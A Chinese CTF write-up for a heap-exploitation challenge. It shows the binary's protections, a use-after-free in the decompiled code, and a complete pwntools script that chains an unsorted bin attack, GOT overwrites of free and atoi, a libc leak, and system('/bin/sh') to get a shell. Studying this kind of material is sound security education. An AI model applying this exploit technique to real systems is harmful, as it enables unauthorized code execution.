# tiesan3-pwn-fake



## checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
```

## 前言

程序逻辑，先输入名字，然后进入菜单界面，拥有添加，删除，编辑功能，无打印功能。

pie未开启，开辟大小已经固定为0x1000。

```c
void __fastcall add(unsigned int a1)
{
  _BYTE *v1; // rbx

  if ( a1 <= 9 )
  {
    buf[a1] = malloc(0x1000uLL);
    puts_0("Content:");
    v1 = buf[a1];
    v1[read(0, buf[a1], 0xFFFuLL)] = 0;
    puts_0("Done!\n");
  }
}
```

漏洞为uaf，如下

```c
ssize_t __fastcall del(unsigned int a1)
{
  ssize_t result; // rax

  if ( a1 <= 9 )
  {
    free(buf[a1]);
    result = puts_0("Done!\n");
  }
  return result;
}
```



## 思路

先采用unsorted bin attack修改bss段的指针数组[0]位置为main_arena + 0x58，然后通过uaf漏洞修改main_arena结构体，修改unsorted bin 头部指向bss段，然而前面所输入的name + 0x10处可以伪造一个chunk，在输入名称的时候我们就伪造一个0x1100的chunk，在进行下次开辟的时候绕过检查就可开辟到bss段修改指针数组，修改free got的值为打印函数，打印atoi got表，泄漏libc，再修改atoi的got为system函数，传入'/bin/sh\x00'即可获得shell。



## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: i0gan
# Env: Linux arch 5.8.14-arch1-1

from pwn import *
import os

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li  = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')


context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']

elf_path  = 'pwn'
MODIFY_LD = 0
arch = '64'
libc_v = '2.23'

ld_path   = '/glibc/' + libc_v + '/' + arch + '/lib/ld-linux-x86-64.so.2'
libs_path = '/glibc/' + libc_v + '/' + arch + '/lib'
libc_path = '/glibc/' + libc_v + '/' + arch + '/lib/libc.so.6'
#libc_path = './libc.so.6'

# change ld path 
if(MODIFY_LD):
	os.system('cp ' + elf_path + ' ' + elf_path + '.bk')
	change_ld_cmd = 'patchelf  --set-interpreter ' + ld_path +' ' + elf_path
	os.system(change_ld_cmd)
	li('modify ld ok!')
	exit(0)

# remote server ip and port
server_ip = "0.0.0.0"
server_port = 0

# if local debug
LOCAL = 1
LIBC  = 1


#--------------------------func-----------------------------
def db():
	if(LOCAL):
		gdb.attach(io)
def ad(i, d):
	sla(':', '1')
	sla(':', str(i))
	sa(':', d)

def md(i, d):
	sla(':', '2')
	sla(':', str(i))
	s(d)

def rm(i):
	sla(':', '3')
	sla(':', str(i))

#--------------------------exploit--------------------------
def exploit():
	li('exploit...')
	s(p64(0) * 2 + p64(0x1100)) # bypass check size
	ad(0, 'A' * 0x100)
	ad(1, 'A' * 0x100)
	ad(2, 'A' * 0x100)
	rm(0)
	p = p64(0) + p64(0x602100 - 0x10) # unsorted bin attack
	md(0, p)
	ad(3, 'B' * 0x100) # malloc to bss

	md(0, p64(0x6020E8) * 3 + p64(0x6020E8)[0:4]) # modify main_arena point to bss 

	ad(4, p64(0) + p64(elf.got['free']) + p64(elf.got['atoi']))
	md(0, p64(0x400937)) # print
	rm(1)
	leak = u64(ru('\x7f')[-5:] + b'\x7f\x00\x00')
	libc.address = leak - libc.sym['atoi']
	li('libc_base: ' + hex(libc.address))
	md(1, p64(libc.sym['system']))
	db()
	sl('/bin/sh\x00')

def finish():
	ia()
	c()

#--------------------------main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		elf = ELF(elf_path)
		if LIBC:
			libc = ELF(libc_path)
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path, "LD_PRELOAD" : libc_path} )
		else:
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path} )
	
	else:
		elf = ELF(elf_path)
		io = remote(server_ip, server_port)
		if LIBC:
			libc = ELF(libc_path)

	exploit()
	finish()

```



